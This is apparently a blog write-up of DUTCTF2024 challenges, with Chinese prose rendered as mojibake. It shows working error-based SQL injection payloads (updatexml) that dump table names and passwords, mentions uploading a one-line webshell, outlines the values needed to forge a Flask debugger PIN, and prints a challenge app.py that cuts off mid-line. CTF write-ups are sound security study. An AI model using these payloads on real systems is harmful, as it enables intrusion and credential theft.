<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶éœ€è¦æ›´æ–°çš„ä½ç½®ï¼Œå³Xpathè·¯å¾„</p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ–‡ä»¶æ›´æ–°åçš„å†…å®¹</p>
<p>æ‰€ä»¥åœ¨é‡‡ç”¨æŠ¥é”™æ³¨å…¥çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜¯éšä¾¿å†™çš„ï¼Œè‡³äºç¬¬äºŒä¸ªå˜›ï¼Œå°±æ˜¯æ³¨å…¥çš„ä½ç½®ï¼Œå¾…ä¼šçœ‹çœ‹Xpath</p>


<p>:::</p>
<p>ä¸€ä¸ªç®€å•çš„ç™»å½•ç³»ç»Ÿæƒ³è¦æ£€æŸ¥æœ‰æ— æ¼æ´å°±éœ€è¦æœ€æœ´ç´ çš„æ£€æµ‹æ–¹å¼</p>
<p>å¼•å·é—­åˆ</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/1.png" class="" width="1">

<p>è¿™é‡Œæµ‹å­—æ®µä¸å¤šè¯´ï¼Œ1â€˜ order by 1#å³å¯ï¼ˆæœ‰3ä¸ªå­—æ®µï¼‰</p>
<p>æŠ¥é”™æ³¨å…¥è¯•è¯•</p>
<p><code>1&#39; and updatexml(0,concat(0x7e,database()),0)#</code></p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/2.png" class="" width="2">

<p>ç„¶åå°±æ˜¯æ­£å¸¸çš„çˆ†åˆ—è¡¨çˆ†å­—æ®µäº†</p>
<p><code>1&#39; and updatexml(0,concat(0x7e,substr((select table_name from information_schema.tables where table_schema = &#39;FreakingData&#39; limit 0,1),1,40)),0)#</code></p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/3.png" class="" width="3">

<p>==ï¼ˆlimit 0,1è¿™ä¸€éƒ¨åˆ†æŒ‡çš„æ˜¯å…¨è¡¨æ‰«æåˆ°ç¬¬0æ¡åæˆªå–ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨åªæœ‰ä¸€æ¡æ•°æ®çš„æƒ…å†µï¼‰==</p>
<p><code>1&#39; and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = &#39;SPRING_SESSION&#39; limit 0,1),1,40)),0)#</code></p>
<p><code>1&#39; and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = &#39;users&#39; limit 0,1),1,40)),0)#</code></p>
<p><code>1&#39; and updatexml(0,concat(0x7e,substr((select password from users limit 0,1),1,40)),0)#</code></p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/4.png" class="" width="4">

<img src="/2024/03/18/competition/202403/DUTCTF2024/5.png" class="" width="5">

<img src="/2024/03/18/competition/202403/DUTCTF2024/6.png" class="" width="6">

<p>==ï¼ˆè¿™ä¸€æ­¥ä¼šå¯¼è‡´flagæ˜¾ç¤ºä¸å…¨çš„åŸå› æ˜¯æŠ¥é”™å†…å®¹çš„é•¿åº¦é™åˆ¶ä¸º32ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨substrå‡½æ•°çš„ç‰¹æ€§ï¼Œæ”¹å˜æˆªå–å­—ç¬¦ä¸²çš„èµ·ç‚¹ç»ˆç‚¹ï¼‰==</p>
<h2 id="Flask-File-Manager"><a href="#Flask-File-Manager" class="headerlink" title="Flask File Manager"></a>Flask File Manager</h2><p>å¼€å§‹æ—¶è´¦å·å¯†ç è—çš„ç¨å¾®æœ‰ç‚¹éšè”½ï¼ŒåŸæœ¬æƒ³è¦sqlæ³¨å…¥ï¼Œä½†å¤±è´¥äº†</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œæ‰çŸ¥é“è´¦å·ä¸ºctferï¼Œå¯†ç ä¸ºdutctf_2024_&gt; _&lt;ï¼ˆæœ‰ä¸ªç©ºæ ¼ï¼ŒæŠŠå®ƒå¿½ç•¥æ‰ï¼Œä¼°è®¡æ˜¯Markdownçš„ä¸€äº›å†²çªï¼‰</p>
<p>è¿™é‡Œæˆ‘ä¸è¯´åºŸè¯ï¼Œç›´æ¥å¼€é—¨è§å±±ï¼Œè®²ä¸€ä¸‹æˆ‘è®¤ä¸ºä¸å¯è¡Œçš„è·¯å¾„</p>
<p>é¦–å…ˆæ˜¯ä¼ :horse:ï¼Œè¿™é‡Œä¼ å…¥ä¸€å¥è¯æœ¨é©¬ä¸Šå»ä¹‹åæƒ³è¦è¯»å–1.phpï¼Œä½†ä¼šæŠ¥permission denied</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/11.png" class="" width="11">

<p>æˆ–è€…è¯´ä½ æƒ³è¿›å…¥uploadç›®å½•ï¼Œä½†æ˜¯è·¯ç”±æ²¡æœ‰ï¼Œè¯´æ˜æ–‡ä»¶ä¸åœ¨æˆ‘ä»¬å¸¸è§çš„ç›®å½•ä¸‹</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/12.png" class="" width="12">

<p>ç›®å‰æœ‰ç‚¹ä¸€ç­¹è«å±•çš„</p>
<p>åšé¢˜æ—¶æ— æ„é—´æ‰¾åˆ°å‡ºé¢˜äººç•™ä¸‹çš„é¢˜ç›®æ–‡ä»¶</p>
<p>å‘ç°app.pyæœ‰ä¸ªerrorè·¯ç”±ï¼Œä¸”è¿™é¢˜ä¸flaskæœ‰å…³ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯flaskæŠ¥é”™å¼•èµ·çš„æ¼æ´</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/13.png" class="" width="13">

<p>æˆåŠŸè¿›å…¥åˆ°debugæ¨¡å¼</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/14.png" class="" width="14">

<p>æ˜¾ç„¶ï¼Œä¸€é“flask pinçš„é¢˜ç›®</p>
<p>+++info  è°ˆè°ˆflask pin</p>
<p>ä¸ºäº†å¾—åˆ°pinç ï¼Œæˆ‘ä»¬éœ€è¦ä»¥ä¸‹6ä¸ªå€¼</p>
<ol>
<li>flaskç™»å½•çš„ç”¨æˆ·å</li>
<li>modname</li>
<li>getaddr(app,â€nameâ€,app.class.name)</li>
<li>flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</li>
<li>å½“å‰ç½‘ç»œmacåœ°å€çš„åè¿›åˆ¶æ•°</li>
<li>dockeræœºå™¨çš„id</li>
</ol>
<p>+++</p>
<p>ä¸€äº›æ•æ„Ÿä¿¡æ¯æˆ‘ä»¬æ˜¯éœ€è¦è¾ƒé«˜æƒé™æ‰èƒ½è¯»å–ï¼Œæ˜¾ç„¶æˆ‘ä»¬çš„æƒé™ä¸å¤Ÿ</p>
<p>è¿™é‡Œç»™å‡ºapp.py</p>
<figure class="highlight python"><figcaption><span>è¡Œé«˜äº®</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, jsonify, abort</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–å¯†é’¥</span></span><br><span class="line">SECRET_KEY_FILE = <span class="string">&#x27;SECRETKEY&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(SECRET_KEY_FILE, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    app.secret_key = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶å­˜å‚¨è·¯å¾„</span></span><br><span class="line">USER_DATA_FILE = <span class="string">&#x27;user_data.json&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ æ–‡ä»¶ä¿å­˜çš„ç›®å½•</span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;/upload&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥ç”¨æˆ·æƒé™</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_permission</span>(<span class="params">username, file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(USER_DATA_FILE, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> user_data:</span><br><span class="line">        permissions = user_data[username].get(<span class="string">&#x27;permissions&#x27;</span>, [])</span><br><span class="line">        <span class="keyword">for</span> path, access <span class="keyword">in</span> permissions.items():</span><br><span class="line">            <span class="keyword">if</span> file_path.startswith(path) <span class="keyword">and</span> access == <span class="string">&#x27;read&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path, username</span>):</span><br><span class="line">    <span class="keyword">if</span> check_permission(username, file_path):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> f.read()</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found.&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Permission denied.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™»å½•è·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            user_data = json.load(f)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> user_data <span class="keyword">and</span> user_data[username][<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">            session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;is_admin&#x27;</span>] = user_data[username].get(<span class="string">&#x27;is_admin&#x27;</span>, <span class="literal">False</span>)  <span class="comment"># ä»user_data.jsonä¸­è¯»å–ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;file_reader&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid username/password&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># éªŒè¯ç”¨æˆ·èº«ä»½</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(USER_DATA_FILE, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> user_data:</span><br><span class="line">        <span class="keyword">return</span> user_data[username][<span class="string">&#x27;password&#x27;</span>] == password</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶ç®¡ç†å™¨è·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file_reader&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        file_path = request.form[<span class="string">&#x27;file_path&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥ç›®å½•è·¯å¾„æ˜¯å¦åˆæ³•</span></span><br><span class="line">        <span class="keyword">if</span> file_path != <span class="string">&#x27;/&#x27;</span> <span class="keyword">and</span> (<span class="keyword">not</span> <span class="built_in">all</span>(char.isalnum() <span class="keyword">or</span> char <span class="keyword">in</span> [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>] <span class="keyword">for</span> char <span class="keyword">in</span> file_path) <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> file_path):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Invalid directory path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥ç›®å½•è·¯å¾„æ˜¯å¦åŒ…å« &#x27;flag&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> file_path:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Nah, flag not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰æƒé™è®¿é—®ç‰¹å®šæ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_permissions(file_path, session[<span class="string">&#x27;username&#x27;</span>]):</span><br><span class="line">            abort(<span class="number">403</span>, <span class="string">&#x27;You are not authorized to read this file&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        file_content = read_file(file_path, session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™æ–‡ä»¶ä¸å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_content:</span><br><span class="line">            abort(<span class="number">404</span>, <span class="string">&#x27;File not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;file_reader.html&#x27;</span>, file_content=file_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;file_reader.html&#x27;</span>, file_content=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€€å‡ºç™»å½•è·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;logged_in&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æƒé™é¡µé¢è·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_user_permissions&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_permissions</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="comment"># æ¸²æŸ“æ¨¡æ¿å¹¶ä¼ é€’ç”¨æˆ·åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            user_data = json.load(f)</span><br><span class="line">        users = <span class="built_in">list</span>(user_data.keys())</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;get_user_permissions.html&#x27;</span>, users=users)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># è·å–POSTè¯·æ±‚ä¸­é€‰æ‹©çš„ç”¨æˆ·</span></span><br><span class="line">        selected_user = request.form[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä» JSON æ–‡ä»¶ä¸­è¯»å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            user_data = json.load(f)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è·å–ç‰¹å®šç”¨æˆ·çš„æƒé™é…ç½®</span></span><br><span class="line">        permissions = user_data.get(selected_user, &#123;&#125;).get(<span class="string">&#x27;permissions&#x27;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(permissions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°æƒé™é¡µé¢è·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/update_permissions&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_permissions</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>):</span><br><span class="line">        abort(<span class="number">403</span>, <span class="string">&#x27;User not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä» JSON æ–‡ä»¶ä¸­è¯»å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="comment"># å¦‚æœç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜ï¼Œåªå…è®¸ä¿®æ”¹è‡ªå·±çš„æƒé™</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>):</span><br><span class="line">            users = [session[<span class="string">&#x27;username&#x27;</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users = [user <span class="keyword">for</span> user, data <span class="keyword">in</span> user_data.items()]</span><br><span class="line">            <span class="comment"># æå–æ‰€æœ‰éç®¡ç†å‘˜ç”¨æˆ·çš„ç”¨æˆ·å</span></span><br><span class="line">            <span class="comment"># users = [user for user, data in user_data.items() if not data[&#x27;is_admin&#x27;]]</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;update_permissions.html&#x27;</span>, users=users)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># è·å–è¡¨å•æ•°æ®</span></span><br><span class="line">        user = request.form[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">        path = request.form[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        access = request.form[<span class="string">&#x27;access&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ–°æ·»åŠ çš„ç›®å½•è·¯å¾„æ˜¯å¦åªåŒ…å« &#x27;/&#x27;ã€&#x27;_&#x27;ã€&#x27;-&#x27;æ•°å­—å’Œå­—æ¯ï¼Œä¸”ä»¥&#x27;/&#x27;ç»“å°¾</span></span><br><span class="line">        <span class="keyword">if</span> path != <span class="string">&#x27;/&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> (path.endswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">and</span> <span class="built_in">all</span>(char.isalnum() <span class="keyword">or</span> char <span class="keyword">in</span> [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>] <span class="keyword">for</span> char <span class="keyword">in</span> path[:-<span class="number">1</span>])):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Invalid directory path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ–°æ·»åŠ çš„ç›®å½•è·¯å¾„æ˜¯å¦åŒ…å« &#x27;flag&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> path:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Nah, flag not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜ï¼Œåªå…è®¸ä¿®æ”¹è‡ªå·±çš„æƒé™</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>) <span class="keyword">and</span> user != session[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            abort(<span class="number">403</span>, <span class="string">&quot;You are not authorized to modify other users&#x27; permissions&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ·»åŠ çš„ç›®å½•æ˜¯å¦ä¸å·²å­˜åœ¨çš„ç›®å½•ç›¸åŒ</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">in</span> user_data[user][<span class="string">&#x27;permissions&#x27;</span>]:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&quot;Directory already exists&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ›´æ–°ç”¨æˆ·æƒé™</span></span><br><span class="line">        user_data[user][<span class="string">&#x27;permissions&#x27;</span>][path] = access</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json.dump(user_data, f, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/update_permissions&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶ä¸Šä¼ è·¯ç”±</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file_uploader&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span 